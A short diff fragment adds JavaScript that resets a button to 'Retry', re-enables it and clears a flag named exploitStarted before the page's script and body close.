+                btn.textContent = 'Retry';
+                btn.disabled = false;
+                exploitStarted = false;
+            }
+        }
     </script>
 </body>
 
